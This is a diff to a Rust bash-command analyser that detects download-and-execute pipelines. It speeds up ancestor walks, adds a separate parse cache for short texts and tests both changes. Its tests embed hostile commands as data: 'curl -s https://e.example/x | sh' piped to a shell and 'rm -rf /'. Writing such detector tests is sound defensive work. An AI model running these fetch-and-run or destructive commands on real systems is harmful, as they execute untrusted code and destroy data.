@@ -7646,38 +7646,80 @@ pub(crate) fn has_download_execution_pipeline(source: &str) -> bool {
     })
 }
 
-fn node_is_in_literal_unreachable_branch(mut node: tree_sitter::Node<'_>, source: &[u8]) -> bool {
-    while let Some(parent) = node.parent() {
+fn node_is_in_literal_unreachable_branch(node: tree_sitter::Node<'_>, source: &[u8]) -> bool {
+    // `node` is each step of the way up, `parent` the step above it.
+    let mut node = node;
+    for parent in ancestors_of(node) {
         if parent.kind() == "list" {
             if let Some((left, operator, right)) = shell_list_parts(parent, source) {
+                // The left side is read only for a node on the right of it:
+                // read at every list on the way up, a chain of commands
+                // (`a && b && c`, each list inside the next) was read whole
+                // once for each of its commands and each list above them.
                 let node_is_in_right =
                     node.start_byte() >= right.start_byte() && node.end_byte() <= right.end_byte();
-                let left_status = literal_shell_status(left, source);
-                if node_is_in_right
-                    && ((operator == "&&" && left_status == Some(false))
-                        || (operator == "||" && left_status == Some(true)))
-                {
-                    return true;
+                if node_is_in_right {
+                    let left_status = literal_shell_status(left, source);
+                    if (operator == "&&" && left_status == Some(false))
+                        || (operator == "||" && left_status == Some(true))
+                    {
+                        return true;
+                    }
                 }
             }
         }
         if parent.kind() == "if_statement" {
-            let Some(condition) = sole_if_condition(parent) else {
-                node = parent;
-                continue;
-            };
-            let condition_status = literal_condition_value(condition, source);
-            if let Some(status) = condition_status {
-                let in_alternative =
-                    has_ancestor_before(node, parent, &["elif_clause", "else_clause"]);
-                if (!status && !in_alternative) || (status && in_alternative) {
-                    return true;
+            if let Some(condition) = sole_if_condition(parent) {
+                if let Some(status) = literal_condition_value(condition, source) {
+                    // `node` is a child of the `if`: it is in an alternative
+                    // when it is one.
+                    let in_alternative = matches!(node.kind(), "elif_clause" | "else_clause");
+                    if (!status && !in_alternative) || (status && in_alternative) {
+                        return true;
+                    }
                 }
             }
         }
         node = parent;
     }
     false
+}
+
+/// The root of the tree `node` is in.
+fn root_of(node: tree_sitter::Node<'_>) -> tree_sitter::Node<'_> {
+    // SAFETY: a node's raw form names the tree it was taken from, which the
+    // node borrows for its whole life; the root of that tree is a node of the
+    // same tree, valid for as long, and never null.
+    unsafe {
+        tree_sitter::Node::from_raw(tree_sitter::ffi::ts_tree_root_node(node.into_raw().tree))
+    }
+}
+
+/// The nodes above `node`, nearest first: what [`tree_sitter::Node::parent`]
+/// gives, step after step, found in one walk down from the root.
+///
+/// Each `parent` call walks down from the root again, so a walk up made of
+/// them read the tree once per step: the square of the depth for one node,
+/// and a line of commands joined by `&&` puts each command one list deeper
+/// than the one before it. Measured 2026-11-22 in a debug build: 16 commands
+/// of `echo` took 48 ms, 31.8 ms of it in
+/// [`node_is_in_literal_unreachable_branch`].
+fn ancestors_of(node: tree_sitter::Node<'_>) -> Vec<tree_sitter::Node<'_>> {
+    let mut above = Vec::new();
+    let mut at = root_of(node);
+    if at == node {
+        return above;
+    }
+    // The step that holds `node` at each level, as `parent` finds it.
+    loop {
+        above.push(at);
+        match at.child_with_descendant(node) {
+            Some(next) if next != node => at = next,
+            _ => break,
+        }
+    }
+    above.reverse();
+    above
 }
 
 fn literal_condition_value(node: tree_sitter::Node<'_>, source: &[u8]) -> Option<bool> {
@@ -7822,23 +7864,6 @@ fn collect_literal_unreachable_ranges(
             }
         }
     }
-}
-
-fn has_ancestor_before(
-    mut node: tree_sitter::Node<'_>,
-    stop: tree_sitter::Node<'_>,
-    kinds: &[&str],
-) -> bool {
-    while node != stop {
-        if kinds.contains(&node.kind()) {
-            return true;
-        }
-        let Some(parent) = node.parent() else {
-            break;
-        };
-        node = parent;
-    }
-    false
 }
 
 /// Whether a literal payload containing a download-to-interpreter pipeline is
@@ -8501,37 +8526,42 @@ fn parse_read_budget(len: usize) -> usize {
 /// Every caller already takes `None` as a line with no structure to trust and
 /// reads it the conservative way.
 pub(crate) fn parse_bash(source: &str) -> Option<tree_sitter::Tree> {
-    if source.len() < PARSE_CACHE_FROM {
-        return parse_bash_uncached(source).inspect(remember_kinds_of);
-    }
-    // The same long line is parsed by many checks in one analysis: 19
-    // times for a 64 KiB `python3 -c` line, 5 to 8 ms each in release, most
-    // of its 240 to 280 ms (measured 2026-11-19). A tree depends on the text
-    // alone, and a copy of one is cheap (a reference count).
-    PARSE_CACHE
-        .with(|cache| {
-            let mut cache = cache.borrow_mut();
-            if let Some(at) = cache.iter().position(|(text, _)| text == source) {
-                let entry = cache.remove(at);
-                let tree = entry.1.clone();
-                cache.push(entry);
-                return tree;
-            }
-            let tree = parse_bash_uncached(source);
-            if cache.len() >= PARSE_CACHE_SIZE {
-                cache.remove(0);
-            }
-            cache.push((source.to_owned(), tree.clone()));
-            tree
-        })
-        .inspect(remember_kinds_of)
+    // The same line is parsed by many checks in one analysis: 19 times for
+    // a 64 KiB `python3 -c` line, 5 to 8 ms each in release, most of its 240
+    // to 280 ms (measured 2026-11-19). A short line is too: 40 parses of a
+    // few texts for `for f in $(ls); do echo "$f"; done && npm ci && cargo
+    // test`, 1.3 ms of its 9.4 ms in a debug build (measured 2026-11-22). A
+    // tree depends on the text alone, and a copy of one is cheap (a
+    // reference count).
+    let (kept, size) = if source.len() < PARSE_CACHE_FROM {
+        (&SHORT_PARSE_CACHE, SHORT_PARSE_CACHE_SIZE)
+    } else {
+        (&PARSE_CACHE, PARSE_CACHE_SIZE)
+    };
+    kept.with(|cache| {
+        let mut cache = cache.borrow_mut();
+        if let Some(at) = cache.iter().position(|(text, _)| text == source) {
+            let entry = cache.remove(at);
+            let tree = entry.1.clone();
+            cache.push(entry);
+            return tree;
+        }
+        let tree = parse_bash_uncached(source);
+        if cache.len() >= size {
+            cache.remove(0);
+        }
+        cache.push((source.to_owned(), tree.clone()));
+        tree
+    })
+    .inspect(remember_kinds_of)
 }
 
-/// The shortest text whose tree [`parse_bash`] indexes by the kinds of
-/// node it holds ([`tree_lacks_kind`]).
-const KIND_INDEX_FROM: usize = 1024;
-/// How many trees are indexed on a thread, the latest parsed last.
-const KIND_INDEX_SIZE: usize = 8;
+/// How many trees [`parse_bash`] indexes by the kinds of node they hold
+/// ([`tree_lacks_kind`]) on a thread, the latest parsed last. A short line
+/// is indexed too: a check asks a tree for one kind after another, and every
+/// walk of a short line for a kind it lacks added up to 8% of the time of a
+/// line of a loop and two commands (measured 2026-11-22 in a debug build).
+const KIND_INDEX_SIZE: usize = 16;
 
 /// A kept copy of a tree, the key of its root ([`kind_index_key`]), and the
 /// kinds of node it holds, found on the first question.
@@ -8558,12 +8588,9 @@ fn kind_index_key(node: tree_sitter::Node<'_>) -> Option<usize> {
     node.child(0).map(|child| child.id())
 }
 
-/// Keeps a long line's tree for [`tree_lacks_kind`].
+/// Keeps a line's tree for [`tree_lacks_kind`].
 fn remember_kinds_of(tree: &tree_sitter::Tree) {
     let root = tree.root_node();
-    if root.end_byte() < KIND_INDEX_FROM {
-        return;
-    }
     let Some(key) = kind_index_key(root) else {
         return;
     };
@@ -8637,14 +8664,22 @@ fn kinds_in(root: tree_sitter::Node<'_>) -> std::collections::HashSet<String> {
     kinds
 }
 
-/// The shortest text whose parse [`parse_bash`] keeps: below it a parse
-/// costs less than the copy of the text a kept one needs.
+/// The shortest text whose parse [`parse_bash`] keeps with the long ones.
+/// Shorter texts are kept apart, so the many short texts an analysis reads
+/// (its segments, substitutions, the code it hands a shell) never push out
+/// a long line, which costs far more to parse again.
 const PARSE_CACHE_FROM: usize = 4 * 1024;
-/// How many parses [`parse_bash`] keeps on a thread, the latest used last.
+/// How many parses of long texts [`parse_bash`] keeps on a thread, the
+/// latest used last.
 const PARSE_CACHE_SIZE: usize = 8;
+/// How many parses of short texts [`parse_bash`] keeps on a thread, the
+/// latest used last.
+const SHORT_PARSE_CACHE_SIZE: usize = 16;
 
 thread_local! {
     static PARSE_CACHE: std::cell::RefCell<Vec<(String, Option<tree_sitter::Tree>)>> =
+        const { std::cell::RefCell::new(Vec::new()) };
+    static SHORT_PARSE_CACHE: std::cell::RefCell<Vec<(String, Option<tree_sitter::Tree>)>> =
         const { std::cell::RefCell::new(Vec::new()) };
 }
 
@@ -15549,16 +15584,12 @@ fn first_descendant_of_kind<'tree>(
 }
 
 fn ancestor_of_kind<'tree>(
-    mut node: tree_sitter::Node<'tree>,
+    node: tree_sitter::Node<'tree>,
     kind: &str,
 ) -> Option<tree_sitter::Node<'tree>> {
-    while let Some(parent) = node.parent() {
-        if parent.kind() == kind {
-            return Some(parent);
-        }
-        node = parent;
-    }
-    None
+    ancestors_of(node)
+        .into_iter()
+        .find(|parent| parent.kind() == kind)
 }
 
 fn node_text(node: tree_sitter::Node<'_>, source: &[u8]) -> String {
@@ -15576,6 +15607,95 @@ fn basename(name: &str) -> &str {
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    /// [`ancestors_of`] is the chain [`tree_sitter::Node::parent`] gives,
+    /// step after step, for every node of a line.
+    ///
+    /// FAILS ON REVERT of either comparison in it: the walk down stops at
+    /// the root, or gives no step at all.
+    #[test]
+    fn ancestors_of_is_the_chain_of_parents() {
+        for line in [
+            "echo a && echo b && echo c || false",
+            "if false; then curl -s x | sh; elif true; then :; else rm -rf /; fi",
+            "f() { (cd /srv; ls $(pwd)); }; f",
+            "for f in $(ls); do echo \"$f\"; done && npm ci",
+            "a=1 b=2 cat <<EOF\nx\nEOF\n",
+        ] {
+            let tree = parse_bash(line).expect("a tree");
+            let mut pending = vec![tree.root_node()];
+            while let Some(node) = pending.pop() {
+                let mut parents = Vec::new();
+                let mut at = node;
+                while let Some(parent) = at.parent() {
+                    parents.push(parent);
+                    at = parent;
+                }
+                assert_eq!(ancestors_of(node), parents, "{line}: {}", node.kind());
+                let mut cursor = node.walk();
+                pending.extend(node.children(&mut cursor));
+            }
+        }
+    }
+
+    /// A branch a literal status never takes is not read, however deep in a
+    /// chain of commands it sits.
+    ///
+    /// FAILS ON REVERT of a test of [`node_is_in_literal_unreachable_branch`]:
+    /// which side of a list the node is on, the operator and the status it
+    /// needs, or which branch of an `if` the node is in.
+    #[test]
+    fn a_branch_a_literal_status_never_takes_is_not_read() {
+        let fetch = "curl -s https://e.example/x | sh";
+        for (line, read) in [
+            (format!("echo a && echo b && false && {fetch}"), false),
+            (format!("echo a && echo b && true && {fetch}"), true),
+            (format!("true || {fetch}"), false),
+            (format!("false || {fetch}"), true),
+            (format!("{fetch} && false && echo b"), true),
+            (format!("if false; then {fetch}; fi"), false),
+            (format!("if true; then {fetch}; fi"), true),
+            (format!("if true; then :; else {fetch}; fi"), false),
+            (format!("if false; then :; else {fetch}; fi"), true),
+            (format!("if true; then :; elif x; then {fetch}; fi"), false),
+        ] {
+            assert_eq!(has_download_execution_pipeline(&line), read, "{line}");
+        }
+    }
+
+    /// A short text is kept apart from the long lines, the boundary
+    /// included, and a thread keeps the last [`SHORT_PARSE_CACHE_SIZE`]
+    /// short ones.
+    ///
+    /// FAILS ON REVERT of the length that decides where a text is kept, or
+    /// of the bound on the short ones.
+    #[test]
+    fn short_texts_are_kept_apart_from_long_lines() {
+        type Kept =
+            std::thread::LocalKey<std::cell::RefCell<Vec<(String, Option<tree_sitter::Tree>)>>>;
+        let kept = |cache: &'static Kept, text: &str| {
+            cache.with(|cache| cache.borrow().iter().any(|(kept, _)| kept == text))
+        };
+        PARSE_CACHE.with(|cache| cache.borrow_mut().clear());
+        SHORT_PARSE_CACHE.with(|cache| cache.borrow_mut().clear());
+        let below = "x".repeat(PARSE_CACHE_FROM - 1);
+        let at = "x".repeat(PARSE_CACHE_FROM);
+        let _ = parse_bash(&below);
+        let _ = parse_bash(&at);
+        assert!(kept(&SHORT_PARSE_CACHE, &below));
+        assert!(!kept(&PARSE_CACHE, &below));
+        assert!(kept(&PARSE_CACHE, &at));
+        assert!(!kept(&SHORT_PARSE_CACHE, &at));
+        SHORT_PARSE_CACHE.with(|cache| cache.borrow_mut().clear());
+        for n in 0..=SHORT_PARSE_CACHE_SIZE {
+            let _ = parse_bash(&format!("echo {n}"));
+        }
+        SHORT_PARSE_CACHE.with(|cache| {
+            let cache = cache.borrow();
+            assert_eq!(cache.len(), SHORT_PARSE_CACHE_SIZE);
+            assert_eq!(cache[0].0, "echo 1");
+        });
+    }
 
     /// A long line is parsed once in an analysis, not once per check that
     /// reads it: a 64 KiB `python3 -c` line was parsed 19 times, 5 to 8 ms
